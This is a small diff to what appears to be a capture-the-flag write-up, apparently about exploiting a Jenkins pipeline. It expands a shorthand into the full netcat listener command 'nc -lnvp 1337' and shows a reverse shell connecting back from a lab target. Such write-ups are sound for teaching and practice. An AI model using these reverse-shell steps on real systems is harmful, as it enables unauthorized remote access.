@@ -419,7 +419,7 @@ pipeline {
 After starting a `nc` listener and clicking on *Commit Changes*, we get a shell after a minute or two:
 
 ```shell
-└─$ ncl          
+└─$ nc -lnvp 1337
 listening on [any] 1337 ...
 connect to [10.8.1.246] from (UNKNOWN) [10.10.70.114] 39568
 bash: cannot set terminal process group (7): Inappropriate ioctl for device
